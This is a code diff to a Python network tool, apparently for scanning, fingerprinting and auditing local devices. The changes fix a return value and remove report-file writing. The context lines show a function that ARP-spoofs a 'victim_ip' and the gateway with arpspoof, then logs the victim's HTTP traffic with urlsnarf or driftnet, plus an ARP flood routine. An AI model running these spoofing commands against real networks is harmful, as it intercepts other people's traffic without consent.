@@ -502,7 +502,8 @@ def fingerprint_devices(devices_df):
         vendor = row["Vendor"]
 
         if ip == "Unknown":
-            return {
+            # Ensure we still return two values
+            fp_info = {
                 "IP Address": ip,
                 "MAC Address": mac,
                 "Vendor": vendor,
@@ -512,6 +513,12 @@ def fingerprint_devices(devices_df):
                 "Open Ports": "None",
                 "Detected Activity": "Unknown / Idle"
             }
+            summary_info = { # Add an empty summary_info
+                "IP Address": ip,
+                "Open Ports": "None",
+                "Detected Activity": "Unknown / Idle"
+            }
+            return fp_info, summary_info
 
         print(f"[+] Fingerprinting {ip}...")
         details = fingerprint_device(ip)
@@ -595,7 +602,7 @@ def mitm_http_logging(victim_ip, interface):
     os.system(f"sudo arpspoof -i {interface} -t {victim_ip} {gateway} &")
     os.system(f"sudo arpspoof -i {interface} -t {gateway} {victim_ip} &")
 
-    # You can use one of these based on what’s installed:
+    # You can use one of these based on what's installed:
     os.system(f"sudo urlsnarf -i {interface}")
     # OR: os.system(f"sudo driftnet -i {interface}")
 
@@ -878,8 +885,6 @@ def auto_arp_replay_flood(interface="wlan0", spoof_replies=True, randomize_mac=F
 
     if not matches:
         log_lines.append("[!] No devices found.")
-        with open("arp_flood_report.txt", "w") as f:
-            f.write("\n".join(log_lines))
         return "\n".join(log_lines)
 
     attacker_mac = get_if_hwaddr(interface)
@@ -971,18 +976,6 @@ def auto_arp_replay_flood(interface="wlan0", spoof_replies=True, randomize_mac=F
     else:
         log_lines.append("✅ No immediate vulnerabilities found, but regular audits and hardened configuration")
         log_lines.append("are still strongly recommended to maintain network integrity.\n")
-
-
-
-    # Save to file
-    with open("arp_flood_report.txt", "w") as f:
-        f.write("\n".join(log_lines))
-
-    # Optional: Copy to static folder for web download
-    try:
-        shutil.copy("arp_flood_report.txt", "static/arp_flood_report.txt")
-    except:
-        pass
 
     return "\n".join(log_lines)
 
